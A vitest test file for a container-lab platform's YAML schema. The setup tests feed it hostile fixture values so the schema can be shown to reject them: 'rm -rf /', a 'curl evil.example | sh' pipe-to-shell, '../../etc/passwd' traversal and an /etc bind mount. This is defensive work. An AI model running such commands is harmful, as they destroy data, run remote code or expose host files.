/**
 * PLATFORM-DOCKER — the lab schema, extended to a second substrate.
 *
 * Two properties are worth stating plainly, because they are what stop the
 * Docker track becoming an escape hatch in a schema that was careful about
 * Kubernetes:
 *
 *   1. **No field can carry a shell fragment.** `command` and `entrypoint` are
 *      string arrays passed to the daemon as argv, exactly like a Pod spec's
 *      `command:`. There is no `script:`, no `exec:`, and no place a `&&` could
 *      reach an interpreter — because nothing interprets these values.
 *   2. **A lab cannot mix vocabularies.** A Docker lab asking for `pod_running`
 *      would load happily and then fail at *check* time, telling a student their
 *      correct answer was wrong. That is caught at load time instead.
 *
 * Plus the per-track presentation metadata in `labs/<track>/track.yaml`, which
 * is optional by design: adding a lab remains the only required step for adding
 * a track.
 */
import { afterEach, describe, expect, it } from 'vitest';
import { mkdtemp, mkdir, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  LabDefinitionError,
  LabRegistry,
  OFFICIAL_DOC_HOSTS,
  LAB_PROVIDERS,
  TrackDefinitionError,
  isEmptyDockerSetup,
  parseLabDefinition,
  parseTrackDefinition,
  requiredImages,
} from '../src/index.js';
import { LABS_DIR } from './helpers.js';
import { scanLabsDirectory } from './catalog-shape.js';

const DOC_URL = 'https://docs.docker.com/reference/cli/docker/container/run/';

/** A minimal Docker lab that passes every rule; tests override one thing at a time. */
function dockerYaml(extra = ''): string {
  return `
id: DOCKER-901
slug: docker-901-fixture
title: Fixture Lab
track: docker
topic: containers
difficulty: beginner
duration_minutes: 15
environment:
  provider: docker
  isolation: container
story: A fixture lab used only by the schema tests.
objectives:
  - Exercise the schema
task:
  summary: Do the thing.
  description: A longer description of the thing.
requirements:
  - type: docker_container_exists
    name: web
    label: Container web exists
references:
  - title: Docker CLI reference
    url: ${DOC_URL}
skills:
  - docker.containers.run
hints:
  - level: 1
    text: Think about what a container is started from.
  - level: 2
    text: Consult the official Docker CLI reference.
${extra}`;
}

function expectIssue(yaml: string, pattern: RegExp): void {
  try {
    parseLabDefinition(yaml, '<test>');
    expect.unreachable('expected the definition to be rejected');
  } catch (error) {
    expect(error).toBeInstanceOf(LabDefinitionError);
    expect((error as LabDefinitionError).format()).toMatch(pattern);
  }
}

// ------------------------------------------------------------- environment

describe('schema — a lab declares its substrate', () => {
  it('accepts the substrates the platform implements', () => {
    // The vocabulary is the platform's, not this track's: PLATFORM-004 added
    // linux and terraform alongside kubernetes and docker.
    expect([...LAB_PROVIDERS]).toEqual(['kubernetes', 'linux', 'docker', 'terraform', 'aws']);
    expect(parseLabDefinition(dockerYaml()).environment).toEqual({
      provider: 'docker',
      isolation: 'container',
      capabilities: [],
    });
  });

  it('rejects a substrate the platform has no provider for', () => {
    expectIssue(dockerYaml().replace('provider: docker', 'provider: firecracker'), /provider/);
  });

  it('rejects an isolation shape that does not match the substrate', () => {
    // A Docker lab claiming namespace isolation would describe an environment
    // the student is not in; lab content is documentation, so it has to be true.
    expectIssue(
      dockerYaml().replace('isolation: container', 'isolation: namespace'),
      /the 'docker' provider isolates with 'container'/,
    );
  });
});

// ------------------------------------------------------ vocabulary matching

describe('schema — a lab cannot mix substrate vocabularies', () => {
  it('rejects a Kubernetes check on a Docker lab', () => {
    expectIssue(
      dockerYaml().replace(
        '  - type: docker_container_exists\n    name: web',
        '  - type: pod_running\n    name: web',
      ),
      /requirements\[0\]\.type 'pod_running' is a kubernetes check/,
    );
  });

  it('rejects a Docker check on a Kubernetes lab', () => {
    const kubernetes = dockerYaml()
      .replace('track: docker', 'track: kubernetes')
      .replace('provider: docker', 'provider: kubernetes')
      .replace('isolation: container', 'isolation: namespace')
      .replace(DOC_URL, 'https://kubernetes.io/docs/concepts/workloads/pods/')
      .replace('skills:\n  - docker.containers.run', 'skills:\n  - kubernetes.pods.create');

    expectIssue(kubernetes, /is a docker check, which the 'kubernetes' provider cannot verify/);
  });

  it('rejects Kubernetes manifests on a Docker lab', () => {
    expectIssue(
      dockerYaml(`
setup:
  manifests:
    - setup/thing.yaml
  verify:
    - type: docker_container_exists
      name: web
      label: web exists
`),
      /setup\.manifests are Kubernetes objects and cannot be applied by the 'docker' provider/,
    );
  });

  it('rejects a Docker setup block on a Kubernetes lab', () => {
    const kubernetes = dockerYaml(`
setup:
  docker:
    images:
      - alpine:3.20
  verify:
    - type: pod_exists
      name: web
      label: web exists
`)
      .replace('track: docker', 'track: kubernetes')
      .replace('provider: docker', 'provider: kubernetes')
      .replace('isolation: container', 'isolation: namespace')
      .replace('  - type: docker_container_exists\n    name: web', '  - type: pod_exists\n    name: web')
      .replace(DOC_URL, 'https://kubernetes.io/docs/concepts/workloads/pods/')
      .replace('skills:\n  - docker.containers.run', 'skills:\n  - kubernetes.pods.create');

    expectIssue(kubernetes, /setup\.docker is a Docker-only field/);
  });

  it('rejects a setup that builds something but verifies nothing', () => {
    expectIssue(
      dockerYaml(`
setup:
  docker:
    images:
      - alpine:3.20
`),
      /setup\.verify must describe at least one check/,
    );
  });
});

// ------------------------------------------------------------ setup.docker

describe('schema — setup.docker carries structure, never a command line', () => {
  const withSetup = (block: string) =>
    dockerYaml(`
setup:
  docker:
${block}
  verify:
    - type: docker_container_exists
      name: web
      label: web exists
`);

  it('parses a full plan, in the order the provider applies it', () => {
    const lab = parseLabDefinition(
      withSetup(`    images:
      - alpine:3.20
    networks:
      - name: ledger-net
        internal: true
    volumes:
      - name: ledger-data
    files:
      - path: Dockerfile
        content: "FROM alpine:3.20\\n"
    containers:
      - name: ledger-api
        image: busybox:1.36
        command: [ "sleep", "3600" ]
        state: exited`),
    );

    const plan = lab.setup.docker!;
    expect(plan.networks[0]).toMatchObject({ name: 'ledger-net', driver: 'bridge', internal: true });
    expect(plan.containers[0]).toMatchObject({ name: 'ledger-api', state: 'exited', restart: 'no' });
    expect(plan.containers[0]?.command).toEqual(['sleep', '3600']);
    // The image a container names counts as required, not just declared ones.
    expect(requiredImages(plan)).toEqual(['alpine:3.20', 'busybox:1.36']);
    expect(isEmptyDockerSetup(plan)).toBe(false);
  });

  it('rejects a command written as a string rather than an argv array', () => {
    // The whole safety property: a command is a list of arguments, so no value
    // in it can ever become syntax.
    expectIssue(
      withSetup(`    containers:
      - name: ledger-api
        image: alpine:3.20
        command: "sh -c 'rm -rf /'"`),
      /command/,
    );
  });

  it('rejects unknown keys, so no `script:` or `exec:` can be smuggled in', () => {
    expectIssue(
      withSetup(`    containers:
      - name: ledger-api
        image: alpine:3.20
        script: curl evil.example | sh`),
      /Unrecognized key|unrecognized_keys|script/i,
    );
    expectIssue(withSetup(`    privileged: true`), /Unrecognized key|unrecognized_keys/i);
  });

  it('rejects control characters in argv, which are the only harmful content', () => {
    expectIssue(
      withSetup(`    containers:
      - name: ledger-api
        image: alpine:3.20
        command: [ "echo", "a\\u0007b" ]`),
      /control characters/,
    );
  });

  it('rejects a workspace path that could escape the session workspace', () => {
    for (const bad of ['../../etc/passwd', '/etc/passwd', 'sub\\\\file']) {
      expectIssue(
        withSetup(`    files:
      - path: "${bad}"
        content: "x"`),
        /relative|traverse|forward slashes/,
      );
    }
  });

  it('rejects a bind mount, which would reach the host filesystem', () => {
    // Only named volumes are expressible. There is no schema for a host path.
    expectIssue(
      withSetup(`    containers:
      - name: ledger-api
        image: alpine:3.20
        volumes:
          - source: /etc
            destination: /host-etc`),
      /Unrecognized key|unrecognized_keys|volume/i,
    );
  });
});

// ------------------------------------------------------------ reset.docker

describe('schema — reset policy', () => {
  it('defaults to purging what a student creates, but keeping images', () => {
    // Re-pulling base images on every reset would turn a two-second reset into
    // a two-minute one, so images are opt-in.
    expect(parseLabDefinition(dockerYaml()).reset.docker).toEqual({
      containers: true,
      volumes: true,
      networks: true,
      images: false,
      workspace: true,
    });
  });

  it('lets an image-management lab opt into removing images', () => {
    const lab = parseLabDefinition(
      dockerYaml(`
reset:
  docker:
    images: true
`),
    );

    expect(lab.reset.docker.images).toBe(true);
    expect(lab.reset.docker.containers).toBe(true);
  });
});

// ---------------------------------------------------------- documentation

describe('schema — documentation, per track', () => {
  it('knows the official hosts for both shipped tracks', () => {
    expect(OFFICIAL_DOC_HOSTS.kubernetes).toContain('kubernetes.io');
    expect(OFFICIAL_DOC_HOSTS.docker).toContain('docs.docker.com');
  });

  it('requires a Docker lab to cite official Docker documentation', () => {
    expectIssue(dockerYaml().replace(DOC_URL, 'https://example.com/run'), /official docker/i);
  });

  it('rejects a commercial training link on a Docker lab too', () => {
    expectIssue(
      dockerYaml().replace(
        `  - title: Docker CLI reference\n    url: ${DOC_URL}`,
        `  - title: Someone else\n    url: https://kodekloud.com/lab\n  - title: Docker CLI reference\n    url: ${DOC_URL}`,
      ),
      /kodekloud\.com/,
    );
  });
});

// ------------------------------------------------------------- track.yaml

describe('track metadata is optional presentation, never a registry of tracks', () => {
  const dirs: string[] = [];

  afterEach(async () => {
    await Promise.all(dirs.splice(0).map((dir) => rm(dir, { recursive: true, force: true })));
  });

  async function labsDir(files: Record<string, string>): Promise<string> {
    const root = await mkdtemp(path.join(tmpdir(), 'jtt-tracks-'));
    dirs.push(root);
    for (const [relative, contents] of Object.entries(files)) {
      const file = path.join(root, relative);
      await mkdir(path.dirname(file), { recursive: true });
      await writeFile(file, contents, 'utf8');
    }
    return root;
  }

  it('parses title, tagline, and order', () => {
    expect(parseTrackDefinition('title: Docker\ntagline: Containers.\norder: 20')).toEqual({
      title: 'Docker',
      tagline: 'Containers.',
      order: 20,
    });
  });

  it('treats an empty file as "nothing to add"', () => {
    expect(parseTrackDefinition('')).toEqual({});
  });

  it('rejects unknown keys', () => {
    expect(() => parseTrackDefinition('colour: blue')).toThrow(TrackDefinitionError);
  });

  it('discovers a brand-new track from its labs alone', async () => {
    // No track.yaml, no code change: the track exists because a lab declares it.
    const root = await labsDir({ 'brand-new/docker-902-x/lab.yaml': dockerYaml().replace('track: docker', 'track: brand-new') });
    const registry = new LabRegistry(root);
    await registry.load();

    expect(registry.loadErrors).toEqual([]);
    expect(registry.tracks()).toEqual([
      expect.objectContaining({ track: 'brand-new', title: 'Brand New', labCount: 1 }),
    ]);
  });

  it('keeps a track working when its track.yaml is malformed', async () => {
    const root = await labsDir({
      'docker/docker-902-x/lab.yaml': dockerYaml(),
      'docker/track.yaml': 'title: [not, a, string]',
    });
    const registry = new LabRegistry(root);
    await registry.load();

    // The problem is reported, but presentation metadata going wrong must not
    // take a working track out of the catalog.
    expect(registry.loadErrors.join('\n')).toMatch(/TRACK_DEFINITION_INVALID/);
    expect(registry.size).toBe(1);
    expect(registry.track('docker')?.title).toBe('Docker');
  });

  it('orders declared tracks first, then the rest alphabetically', async () => {
    const root = await labsDir({
      'docker/docker-902-x/lab.yaml': dockerYaml(),
      'docker/track.yaml': 'title: Docker\norder: 20',
      'aardvark/docker-903-x/lab.yaml': dockerYaml()
        .replace('id: DOCKER-901', 'id: DOCKER-903')
        .replace('slug: docker-901-fixture', 'slug: docker-903-x')
        .replace('track: docker', 'track: aardvark'),
      'zebra/docker-904-x/lab.yaml': dockerYaml()
        .replace('id: DOCKER-901', 'id: DOCKER-904')
        .replace('slug: docker-901-fixture', 'slug: docker-904-x')
        .replace('track: docker', 'track: zebra'),
    });
    const registry = new LabRegistry(root);
    await registry.load();

    expect(registry.tracks().map((t) => t.track)).toEqual(['docker', 'aardvark', 'zebra']);
  });

  it('reads the shipped tracks straight off disk', async () => {
    const registry = new LabRegistry(LABS_DIR);
    await registry.load();
    const disk = await scanLabsDirectory(LABS_DIR);

    // Every shipped track, in catalog order, with the title and order it
    // declares for itself — read from the same `track.yaml` files the loader
    // read, so adding a track needs no edit here. A track that declares no
    // `track.yaml` is still listed, titled from its slug and ordered last.
    expect(registry.tracks().map((t) => ({ track: t.track, order: t.order }))).toEqual(
      disk.tracks.map((t) => ({ track: t.track, order: t.declaredOrder })),
    );
    for (const track of registry.tracks()) {
      const declared = disk.tracks.find((t) => t.track === track.track)?.declaredTitle;
      if (declared) expect(track.title, track.track).toBe(declared);
      else expect(track.title, track.track).toBeTruthy();
    }
  });
});
